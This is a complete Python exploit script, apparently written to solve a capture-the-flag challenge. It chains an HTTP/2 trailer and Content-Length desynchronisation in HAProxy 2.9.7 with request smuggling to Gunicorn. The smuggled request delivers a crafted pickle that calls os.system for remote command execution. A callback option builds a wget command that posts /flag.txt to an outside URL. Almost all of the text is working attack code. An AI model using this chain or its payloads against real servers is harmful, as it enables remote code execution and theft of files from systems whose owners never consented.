#!/usr/bin/env python3
"""Exploit re-strictions with the deployed Werkzeug 3.1.9 stack.

This does not rely on Content-Type whitespace normalization. It uses an HTTP/2
trailer / Content-Length desynchronization in HAProxy 2.9.7, then smuggles a
normal multipart request to Gunicorn 25.3.0.
"""

from __future__ import annotations

import argparse
import socket
import time
from urllib.parse import urlparse

from h2.config import H2Configuration
from h2.connection import H2Connection
from h2.events import (
    ConnectionTerminated,
    DataReceived,
    ResponseReceived,
    StreamEnded,
    StreamReset,
)


def exploit_pickle(command: str) -> bytes:
    """Build a protocol-0 pickle using only the allowed builtins.getattr."""
    if "\n" in command or "\r" in command:
        raise ValueError("the protocol-0 command cannot contain newlines")

    return (
        b"cbuiltins\ngetattr\np0\n"
        b"(g0\nV__self__\ntRp1\n0"        # builtins module
        b"g0\n(g1\nV__import__\ntRp2\n0"  # builtins.__import__
        b"g2\n(Vos\ntRp3\n0"              # import("os")
        b"g0\n(g3\nVsystem\ntRp4\n0"      # os.system
        b"g4\n(V" + command.encode() + b"\ntR."
    )


def multipart(payload: bytes, boundary: bytes = b"----restrictions") -> tuple[bytes, bytes]:
    body = (
        b"--" + boundary + b"\r\n"
        b'Content-Disposition: form-data; name="file"; filename="work.pkl"\r\n'
        b"Content-Type: application/octet-stream\r\n"
        b"\r\n"
        + payload
        + b"\r\n--"
        + boundary
        + b"--\r\n"
    )
    return boundary, body


def make_inner_request(command: str, authority: bytes) -> bytes:
    boundary, body = multipart(exploit_pickle(command))
    return (
        b"POST /office/process HTTP/1.1\r\n"
        b"Host: " + authority + b"\r\n"
        b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n"
        b"Connection: close\r\n"
        b"\r\n"
        + body
    )


def receive_stream(
    conn: H2Connection,
    sock: socket.socket,
    stream_id: int,
    timeout: float,
) -> tuple[bytes | None, bytes]:
    deadline = time.monotonic() + timeout
    status: bytes | None = None
    body = bytearray()

    while time.monotonic() < deadline:
        sock.settimeout(max(0.05, deadline - time.monotonic()))
        try:
            data = sock.recv(65535)
        except TimeoutError:
            break

        if not data:
            break

        for event in conn.receive_data(data):
            if isinstance(event, ResponseReceived) and event.stream_id == stream_id:
                status = dict(event.headers).get(b":status")
            elif isinstance(event, DataReceived):
                conn.acknowledge_received_data(
                    event.flow_controlled_length, event.stream_id
                )
                if event.stream_id == stream_id:
                    body.extend(event.data)
            elif isinstance(event, StreamEnded) and event.stream_id == stream_id:
                pending = conn.data_to_send()
                if pending:
                    sock.sendall(pending)
                return status, bytes(body)
            elif isinstance(event, StreamReset) and event.stream_id == stream_id:
                raise RuntimeError(
                    f"HTTP/2 stream {stream_id} reset with error {event.error_code}"
                )
            elif isinstance(event, ConnectionTerminated):
                raise RuntimeError(
                    f"HTTP/2 connection terminated with error {event.error_code}"
                )

        pending = conn.data_to_send()
        if pending:
            sock.sendall(pending)

    raise TimeoutError(f"timed out waiting for HTTP/2 stream {stream_id}")


def send_data(conn: H2Connection, stream_id: int, data: bytes) -> None:
    """Queue DATA frames without exceeding the peer's frame-size limit."""
    while data:
        size = min(len(data), conn.max_outbound_frame_size)
        chunk, data = data[:size], data[size:]
        conn.send_data(stream_id, chunk, end_stream=not data)


def exploit(
    host: str,
    port: int,
    command: str,
    *,
    delay: float = 0.5,
    timeout: float = 12.0,
) -> tuple[bytes | None, bytes]:
    authority = b"x"
    inner = make_inner_request(command, authority)

    # HAProxy serializes stream 3 to this exact H1 header block. Stream 1's
    # false Content-Length makes Gunicorn consume this block as request body.
    carrier_headers = (
        b"POST / HTTP/1.1\r\n"
        b"host: " + authority + b"\r\n"
        b"content-length: " + str(len(inner)).encode() + b"\r\n"
        b"\r\n"
    )
    desync_length = len(carrier_headers)

    config = H2Configuration(
        client_side=True,
        header_encoding=None,
        validate_outbound_headers=False,
        normalize_outbound_headers=False,
    )
    conn = H2Connection(config=config)

    with socket.create_connection((host, port), timeout=timeout) as sock:
        conn.initiate_connection()

        # HAProxy validates C-L when END_STREAM is on DATA, but 2.9.7 does not
        # validate the remaining C-L when END_STREAM arrives on trailers.
        conn.send_headers(
            1,
            [
                (b":method", b"GET"),
                (b":scheme", b"http"),
                (b":authority", authority),
                (b":path", b"/"),
                (b"content-length", str(desync_length).encode()),
            ],
            end_stream=False,
        )
        conn.send_headers(1, [(b"x-trailer", b"y")], end_stream=True)
        sock.sendall(conn.data_to_send())

        first_status, _ = receive_stream(conn, sock, 1, timeout)
        if first_status != b"200":
            raise RuntimeError(f"desync setup returned HTTP {first_status!r}")

        # Send only stream 3's headers first. Gunicorn is blocked draining the
        # missing stream 1 body, so these bytes satisfy that Content-Length.
        conn.send_headers(
            3,
            [
                (b":method", b"POST"),
                (b":scheme", b"http"),
                (b":authority", authority),
                (b":path", b"/"),
                (b"content-length", str(len(inner)).encode()),
            ],
            end_stream=False,
        )
        sock.sendall(conn.data_to_send())

        # Gunicorn's gthread worker must finish draining and return the socket
        # to its keep-alive poller before the smuggled request is delivered.
        time.sleep(delay)

        send_data(conn, 3, inner)
        sock.sendall(conn.data_to_send())
        return receive_stream(conn, sock, 3, timeout)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="192.168.16.17")
    parser.add_argument("--port", type=int, default=1337)
    parser.add_argument("--delay", type=float, default=0.5)
    parser.add_argument("--timeout", type=float, default=12.0)
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--command")
    group.add_argument("--callback", help="HTTP URL that receives /flag.txt as POST data")
    args = parser.parse_args()

    if args.callback:
        parsed = urlparse(args.callback)
        if parsed.scheme != "http" or not parsed.netloc:
            parser.error("--callback must be an http:// URL")
        command = f"wget -qO- --post-file=/flag.txt {args.callback}"
    else:
        command = args.command

    status, body = exploit(
        args.host,
        args.port,
        command,
        delay=args.delay,
        timeout=args.timeout,
    )
    print(f"HTTP status: {status.decode() if status else 'none'}")
    print(body.decode("latin-1", "replace"))


if __name__ == "__main__":
    main()
